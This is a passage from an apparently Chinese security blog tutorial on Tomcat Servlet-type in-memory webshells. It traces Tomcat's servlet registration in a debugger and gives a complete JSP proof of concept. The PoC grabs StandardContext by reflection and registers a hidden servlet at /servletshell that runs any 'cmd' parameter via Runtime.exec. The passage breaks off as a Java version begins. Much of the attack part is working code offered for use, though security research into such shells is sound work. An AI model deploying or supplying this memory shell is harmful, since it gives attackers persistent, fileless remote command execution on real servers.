+</span></span><span style=display:flex><span>   <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>init</span>(ServletConfig var1) <span style=color:#66d9ef>throws</span> ServletException; <span style=color:#75715e>// init方法，创建好实例后会被立即调用，仅调用一次。  </span>
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>   ServletConfig <span style=color:#a6e22e>getServletConfig</span>();<span style=color:#75715e>//返回一个ServletConfig对象，其中包含这个servlet初始化和启动参数  </span>
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>   <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>service</span>(ServletRequest var1, ServletResponse var2) <span style=color:#66d9ef>throws</span> ServletException, IOException;  <span style=color:#75715e>//每次调用该servlet都会执行service方法，service方法中实现了我们具体想要对请求的处理。  </span>
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>   String <span style=color:#a6e22e>getServletInfo</span>();<span style=color:#75715e>//返回有关servlet的信息，如作者、版本和版权.  </span>
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>   <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>destroy</span>();<span style=color:#75715e>//只会在当前servlet所在的web被卸载的时候执行一次，释放servlet占用的资源  </span>
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>从 Servlet 接口中我们可以看出，如果我们要写恶意代码，应该是写在<code>service()</code>中，所以这里我们直接创建一个恶意的 Servlet 类：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> tomcatshell.servlet;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.servlet.*;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.servlet.annotation.WebServlet;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.IOException;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@WebServlet</span>(name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;servletshell&#34;</span>,value <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/servletshell&#34;</span>)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>ServletTest</span> <span style=color:#66d9ef>implements</span> Servlet {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Override</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>init</span>(ServletConfig config) <span style=color:#66d9ef>throws</span> ServletException {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Override</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> ServletConfig <span style=color:#a6e22e>getServletConfig</span>() {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Override</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>service</span>(ServletRequest req, ServletResponse res) <span style=color:#66d9ef>throws</span> ServletException, IOException {
+</span></span><span style=display:flex><span>        String cmd <span style=color:#f92672>=</span> req.<span style=color:#a6e22e>getParameter</span>(<span style=color:#e6db74>&#34;cmd&#34;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (cmd <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>try</span> {
+</span></span><span style=display:flex><span>                Runtime.<span style=color:#a6e22e>getRuntime</span>().<span style=color:#a6e22e>exec</span>(cmd);
+</span></span><span style=display:flex><span>            } <span style=color:#66d9ef>catch</span> (IOException e) {
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException(e);
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Override</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>getServletInfo</span>() {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;&#34;</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Override</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>destroy</span>() {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h2 id=servlet-流程分析>Servlet 流程分析
+<a class=anchor href=#servlet-%e6%b5%81%e7%a8%8b%e5%88%86%e6%9e%90>#</a></h2><p>因为 Web 应用程序的顺序是 Listener -> Filter -> Servlet，所以我们在调用 Servlet 的时候也会看到之前 Listener 和 Filter 的流程。</p><p>先把断点下在<code>service()</code>方法，可以看到这个地方是有 Filter 的流程的。</p><p><img src=https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/ContainsFilter.png alt></p><h3 id=获取到-http-请求>获取到 HTTP 请求
+<a class=anchor href=#%e8%8e%b7%e5%8f%96%e5%88%b0-http-%e8%af%b7%e6%b1%82>#</a></h3><p>断点打在<code>HTTP11Processor</code>类的<code>service()</code>方法，重新开始调试。</p><p><img src=https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/HTTP11Processor.png alt></p><p>这个<code>HTTP11Processor</code>类是一个网络请求的类，它的作用是处理数据包，而它的<code>service()</code>方法主要是处理 HTTP 包的请头，主要做了赋值的工作，后续会通过<code>ByteBuff</code>进行数据解析。</p><p>往下走，走到一行<code>this.getAdapter().service(this.request, this.response);</code>这里。</p><p><img src=https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/343Service.png alt></p><p>跟进去，进入<code>CoyoteAdapter</code>类的<code>service()</code>方法中，<code>CoyoteAdapter</code>是<code>Processor</code>和<code>Valve</code>之间的适配器。</p><p><img src=https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/coyoteAdapter.png alt></p><p>关注一下传参，参数是<code>org.apache.coyote.Request</code>和<code>org.apache.coyote.Response</code>类型的对象，后面又进行了<code>getNote()</code>方法的调用。</p><p><img src=https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/reqAndres.png alt></p><p><img src=https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/getNote.png alt></p><p>这两个<code>getNote()</code>方法都是取<code>notes</code>数组里指定 pos 的对象。继续往下，如果<code>request == null</code>，就会进行一系列赋值：</p><p><img src=https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/requestValue.png alt></p><p>直到<code>this.connector.getService().getContainer().getPipeline().getFirst().invoke(request, response);</code>这一行：</p><p><img src=https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/coyoteAdapterService.png alt></p><p>首先是变量<code>connector</code>，里面存放了一整个 HTTP 包。</p><p><img src=https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/connector.png alt></p><p><code>connector.getService()</code>返回的是 Connector 关联的 Service 熟悉，也就是<code>StandardService</code>对象。</p><p><img src=https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/getService.png alt></p><p><code>connector.getService().getContainer()</code>返回的是 Service 中的容器 Engine 属性，也就是<code>StandardEngine</code>对象。</p><p><img src=https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/getContainer.png alt></p><p><code>connector.getService().getContainer().getPipeline()</code>返回的是<code>StandardEngine</code>里的<code>Pipeline</code>属性，也就是<code>StandardPipeline</code>对象。</p><p><img src=https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/getPipeline.png alt></p><p>返回的是<code>StandardPipeline</code>的 Valve 类型的数行 first 或者 basic。</p><p><img src=https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/getFirst.png alt></p><p>然后走到<code>invoke()</code>方法中，<code>StandardEngineValve#inovke()</code>进行 Host 相关的简单判断，再往下，host 是 Tomcat 内置的 host。后续的内容和 Filter 比较像，就是多个<code>invoke()</code>调用，所以这就是一个获取到 HTTP 请求进行预处理的过程。</p><h3 id=读取-webxml>读取 web.xml
+<a class=anchor href=#%e8%af%bb%e5%8f%96-webxml>#</a></h3><p>断点打在<code>ContextConfig#webConfig()</code>，读取 web.xml 的流程和 Listener 型内存马类似。</p><p>开始调试，首先我们获取到了 web.xml 文件：</p><p><img src=https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/getWebXml.png alt></p><p>中间是处理 Filter、Listener 等信息的代码，所以这里跳过，到下面的<code>configureContext(webXml)</code>。</p><p><img src=https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/into.png alt></p><p>跟进，看到<code>configureContext()</code>方法也是先获取 Listener、Filter，还有<code>localeEncodingMappings</code>等，继续向下，直到 1281 行开始进行 Servlet 的读取。</p><p><img src=https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/fourServlets.png alt></p><h3 id=创建与装载-standardwrapper>创建与装载 StandardWrapper
+<a class=anchor href=#%e5%88%9b%e5%bb%ba%e4%b8%8e%e8%a3%85%e8%bd%bd-standardwrapper>#</a></h3><p>第 1282 行，<code>createWrapper()</code> 实际上就是创建了<code>StandardWrapper</code>，后续代码会对它进行加载和处理。</p><p>再往下，会将所有的 Servlet 保存到 Wrapper 中，后面代码很多是在把 web.xml 中的数据写到<code>StandardWrapper</code>中：</p><p><img src=https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/getServletName.png alt></p><p>继续往下看，到 1334 行，将 Wrapper 添加到<code>context</code>中，这里的<code>context</code>就是<code>StandardContext</code>。</p><p><img src=https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/addChild.png alt></p><p>后续把 web.xml 中的内容装载进<code>StandardWrapper</code>中，也就是<code>StandardWrapper</code>的装载。</p><p>那么，Wrapper 中包含了我们的恶意 Servlet 内存马，那 Wrapper 最后被放到哪里了？其实<code>addChild()</code>方法把 Wrapper 放到了<code>StandardContext</code>中去了，之后做了一系列处理。</p><p>我们跟进<code>addChild()</code>方法，此时到的是<code>StandardContext</code>类的<code>addChild()</code>方法，它判断这个 Servlet 是否是 JSP 的 Servlet：</p><p><img src=https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/addChildJSP.png alt></p><p>然后运行到<code>super.addChild(child);</code>这里，是<code>ContainerBase</code>这个抽象类。<code>ContainerBase</code>类的<code>addChild()</code>方法判断了是否开启全局安全这个配置。往下，跟进到<code>addChildInternal()</code>方法中：</p><p><img src=https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/addChildInternal.png alt></p><p>然后到 753 行这里调用了一个语句：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span>child.<span style=color:#a6e22e>start</span>();
+</span></span></code></pre></div><p><code>start()</code>方法，就是启动一个线程，在 Servlet 中就是开启此 Servlet 的线程，跟进去看一下 Servlet 的线程被启动后做了什么。</p><p><img src=https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/LifecycleBase.png alt></p><p>从<code>ContainerBase</code>类进入<code>LifecycleBase</code>类。</p><p><img src=https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/LifecycleBaseInit.png alt></p><p><code>LifecycleBase</code>类的<code>start()</code>方法先进行一些基础的日志判断，然后走到<code>init()</code>方法中。<code>init()</code>方法中是一些赋值，主要看后面的<code>startInternal()</code>。</p><p><img src=https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/startInternal.png alt></p><p>直接跟进的话进不去<code>StandardContext#startInternal()</code>方法，所以在<code>StandardContext#startInternal()</code>这里打上断点，直接调试过去。</p><p><img src=https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/StandardWrapperstartInternal.png alt></p><p>往下走，到 5130 行，调用了<code>fireLifecycleEvent()</code>，这个方法主要做解析 web.xml 的工作。</p><p><img src=https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/fireLifecycleEvent.png alt></p><p>继续往下调试，又会走到<code>ContextConfig#configureContext()</code>方法。</p><p><img src=https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/configureContext.png alt></p><p>总的来说，<code>addChild()</code>方法把 Servlet 放进 children zhong ,children 就是<code>StandardWrapper</code>。</p><p><img src=https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/addChildDown.png alt></p><p>在<code>addChild()</code>方法之后，调用<code>addServletMappingDecoded()</code>方法添加映射关系。</p><p>将 URL 路径和 Servlet 类做映射。</p><p><img src=https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/addServletMappingDecoded.png alt></p><p>Servlet 的生成与动态添加依次进行以下步骤：</p><ul><li>通过<code>context.createWapper()</code>创建 Wrapper 对象</li><li>设置 Servlet 的<code>LoadOnStartUp</code>的值</li><li>设置 Servlet 的 Name</li><li>设置 Servlet 对应的 class</li><li>将 Servlet 添加到 context 的 children 中。</li><li>将 URL 路径和 Servlet 类做映射</li></ul><h3 id=加载-servlet>加载 Servlet
+<a class=anchor href=#%e5%8a%a0%e8%bd%bd-servlet>#</a></h3><p>我们在<code>StandardContext#startInternal()</code>中，进入<code>fireLifecycleEvent()</code>方法，之后又做了一次<code>StandardWrapper</code>的装载工作。</p><p><img src=https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/fireLifecycleEvent2.png alt></p><p>所以这里我们重新回到<code>StandardContext#startInternal()</code>中，从<code>fireLifecycleEvent()</code>往下走。</p><p>继续往下走，大致是一些赋值，主要在下面：</p><p><img src=https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/loadOnStartUp.png alt></p><p>跟进到<code>loadOnStartup()</code>方法；</p><p><img src=https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/loadOnStartUpCode.png alt></p><p>可以看到它对<code>loadOnStartUp</code>属性进行了判断：</p><p><img src=https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/JudgeloadOnStartUp.png alt></p><p>在 Servlet 的配置中，<code>&lt;load-on-startup>1&lt;/load-on-startup></code>的含义是：标记容器是否在启动时就加载这个 Servlet。当值大于等于 0 时，表示容器在应用启动时就加载这个 Servlet；当是负数或者没有指定时，则表示容器在该 Servlet 被选择时才被加载。正数的值越小，启动该 Servlet 的优先级越高。</p><p>如果要在 web.xml 中配置应该是这样：<code>&lt;load-on-startup>1&lt;/load-on-startup></code>。</p><p>这里对应的实际上是 Tomcat Servlet 的懒加载机制。</p><p>很明显这里 web.xml 的内容不是我们可控的，所以必须要把恶意的 Servlet 放到最前面去加载。</p><h2 id=servlet-内存马>Servlet 内存马
+<a class=anchor href=#servlet-%e5%86%85%e5%ad%98%e9%a9%ac>#</a></h2><h3 id=servlet-工作流程总结>Servlet 工作流程总结
+<a class=anchor href=#servlet-%e5%b7%a5%e4%bd%9c%e6%b5%81%e7%a8%8b%e6%80%bb%e7%bb%93>#</a></h3><p>首先获取到 HTTP 请求，然后读取到 web.xml，并且<code>webConfig()</code>方法中还创建了一个<code>StandardWrapper</code>，而我们的 Servlet 都会被保存到这个<code>StandardWrapper</code>中，后续这个 Wrapper 是放到 Context 中的，一个 Context 对应一个 Web 应用，可以包含多个 Wrapper，一个 Wrapper 对应一个 Servlet，负责管理 Servlet。在创建和加载完<code>StandardWrapper</code>之后，我们需要把加载的 Servlet 从<code>StandardWrapper</code>中读取出来，所以这里就到了我们最后的一个过程：加载 Servlet，对应有一个很重要的属性值——<code>loadOnStartUp</code>。</p><h3 id=servlet-内存马的攻击>Servlet 内存马的攻击
+<a class=anchor href=#servlet-%e5%86%85%e5%ad%98%e9%a9%ac%e7%9a%84%e6%94%bb%e5%87%bb>#</a></h3><p>攻击主要有几个关键点：</p><ol><li>StandardWrapper</li><li>StandardContext</li><li>恶意 Servlet</li></ol><p><img src=https://drun1baby.top/2022/09/04/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-05-Tomcat-%E4%B9%8B-Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/AttackRoute.png alt></p><ol><li>获取<code>StandardContext</code>对象</li><li>编写恶意 Servlet</li><li>通过<code>StandardContext.createWrapper()</code>来创建<code>StandardWrapper</code>对象</li><li>设置<code>StandardWrapper</code>对象的<code>loadOnStartup</code>属性值</li><li>设置<code>StandardWrapper</code>对象的<code>ServletName</code>属性值</li><li>设置<code>StandardWrapper</code>对象的<code>ServletClass</code>属性值</li><li>将<code>StandardWrapper</code>对象添加进<code>StandardContext</code>对象的<code>children</code>属性中</li><li>通过<code>StandardContext.addServletMappingDecoded()</code>添加对应的路径映射</li></ol><h3 id=jsp-版-poc>JSP 版 POC
+<a class=anchor href=#jsp-%e7%89%88-poc>#</a></h3><h4 id=获取-standardcontext-对象>获取 StandardContext 对象
+<a class=anchor href=#%e8%8e%b7%e5%8f%96-standardcontext-%e5%af%b9%e8%b1%a1>#</a></h4><p><code>StandardContext</code>对象获取方式多种多样：</p><pre tabindex=0><code class=language-jsp data-lang=jsp>&lt;%   
+	Field reqF = request.getClass().getDeclaredField(&#34;request&#34;);    
+	reqF.setAccessible(true);    
+	Request req = (Request) reqF.get(request);    	
+	StandardContext standardContext = (StandardContext) req.getContext();
+%&gt;
+</code></pre><p>或者</p><pre tabindex=0><code class=language-jsp data-lang=jsp>&lt;%   
+	ServletContext servletContext = request.getSession().getServletContext();    
+	Field appContextField = servletContext.getClass().getDeclaredField(&#34;context&#34;);
+	appContextField.setAccessible(true);    
+    ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);
+	Field standardContextField = applicationContext.getClass().getDeclaredField(&#34;context&#34;);
+	standardContextField.setAccessible(true);    
+	StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
+%&gt;
+</code></pre><h4 id=编写恶意-servlet>编写恶意 Servlet
+<a class=anchor href=#%e7%bc%96%e5%86%99%e6%81%b6%e6%84%8f-servlet>#</a></h4><pre tabindex=0><code class=language-jsp data-lang=jsp>&lt;%!
+ 
+    public class Shell_Servlet implements Servlet {
+        @Override
+        public void init(ServletConfig config) throws ServletException {
+        }
+        @Override
+        public ServletConfig getServletConfig() {
+            return null;
+        }
+        @Override
+        public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
+            String cmd = req.getParameter(&#34;cmd&#34;);
+            if (cmd !=null){
+                try{
+                    Runtime.getRuntime().exec(cmd);
+                }catch (IOException e){
+                    e.printStackTrace();
+                }catch (NullPointerException n){
+                    n.printStackTrace();
+                }
+            }
+        }
+        @Override
+        public String getServletInfo() {
+            return null;
+        }
+        @Override
+        public void destroy() {
+        }
+    }
+ 
+%&gt;
+</code></pre><h4 id=创建-wrapper-对象>创建 Wrapper 对象
+<a class=anchor href=#%e5%88%9b%e5%bb%ba-wrapper-%e5%af%b9%e8%b1%a1>#</a></h4><pre tabindex=0><code class=language-jsp data-lang=jsp>&lt;%
+    Shell_Servlet shell_servlet = new Shell_Servlet();
+    String name = shell_servlet.getClass().getSimpleName();
+ 
+    Wrapper wrapper = standardContext.createWrapper();
+    wrapper.setLoadOnStartup(1);
+    wrapper.setName(name);
+    wrapper.setServlet(shell_servlet);
+    wrapper.setServletClass(shell_servlet.getClass().getName());
+%&gt;
+</code></pre><p>把 Wrapper 添加到<code>StandardContext</code>：</p><pre tabindex=0><code class=language-jsp data-lang=jsp>&lt;%
+    standardContext.addChild(wrapper);
+    standardContext.addServletMappingDecoded(&#34;/shell&#34;,name);
+%&gt;
+</code></pre><h4 id=完整-poc>完整 POC
+<a class=anchor href=#%e5%ae%8c%e6%95%b4-poc>#</a></h4><pre tabindex=0><code class=language-jsp data-lang=jsp>&lt;%@ page import=&#34;java.lang.reflect.Field&#34; %&gt;
+&lt;%@ page import=&#34;org.apache.catalina.core.StandardContext&#34; %&gt;
+&lt;%@ page import=&#34;org.apache.catalina.connector.Request&#34; %&gt;
+&lt;%@ page import=&#34;java.io.IOException&#34; %&gt;
+&lt;%@ page import=&#34;org.apache.catalina.Wrapper&#34; %&gt;
+&lt;%@ page contentType=&#34;text/html;charset=UTF-8&#34; language=&#34;java&#34; %&gt;
+ 
+&lt;%
+    Field reqF = request.getClass().getDeclaredField(&#34;request&#34;);
+    reqF.setAccessible(true);
+    Request req = (Request) reqF.get(request);
+    StandardContext standardContext = (StandardContext) req.getContext();
+%&gt;
+ 
+&lt;%!
+ 
+    public class Shell_Servlet implements Servlet {
+        @Override
+        public void init(ServletConfig config) throws ServletException {
+        }
+        @Override
+        public ServletConfig getServletConfig() {
+            return null;
+        }
+        @Override
+        public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
+            String cmd = req.getParameter(&#34;cmd&#34;);
+            if (cmd !=null){
+                try{
+                    Runtime.getRuntime().exec(cmd);
+                }catch (IOException e){
+                    e.printStackTrace();
+                }catch (NullPointerException n){
+                    n.printStackTrace();
+                }
+            }
+        }
+        @Override
+        public String getServletInfo() {
+            return null;
+        }
+        @Override
+        public void destroy() {
+        }
+    }
+ 
+%&gt;
+ 
+&lt;%
+    Shell_Servlet shell_servlet = new Shell_Servlet();
+    String name = shell_servlet.getClass().getSimpleName();
+ 
+    Wrapper wrapper = standardContext.createWrapper();
+    wrapper.setLoadOnStartup(1);
+    wrapper.setName(name);
+    wrapper.setServlet(shell_servlet);
+    wrapper.setServletClass(shell_servlet.getClass().getName());
+%&gt;
+ 
+&lt;%
+    standardContext.addChild(wrapper);
+    standardContext.addServletMappingDecoded(&#34;/servletshell&#34;,name);
+%&gt;
+</code></pre><p>Servlet 型内存马无法使所有请求都经过恶意代码，只有访问我们设定的 URL 才能触发，这是 Servlet 型内存马的缺点，而且容易被发现。需要先访问 Servlet.jsp，完成对内存马的注册，然后再访问<code>/servletshell</code>，并带上<code>cmd</code>参数才能实现命令执行。</p><h3 id=java-型内存马>Java 型内存马
+<a class=anchor href=#java-%e5%9e%8b%e5%86%85%e5%ad%98%e9%a9%ac>#</a></h3><p>Java 型内存马是需要在 web.xml 中加上 Servlet 的调用的：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> tomcatShell.Servlet;  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.catalina.Wrapper;  
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.catalina.connector.Request;  
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.catalina.core.StandardContext;  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.servlet.*;  
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.servlet.http.HttpServletRequest;  
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.servlet.http.HttpServletResponse;  
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.BufferedReader;  
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.IOException;  
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.InputStream;  
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.InputStreamReader;  
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.reflect.Field;  
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>ServletShell</span> <span style=color:#66d9ef>implements</span> Servlet {  
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Override</span>  
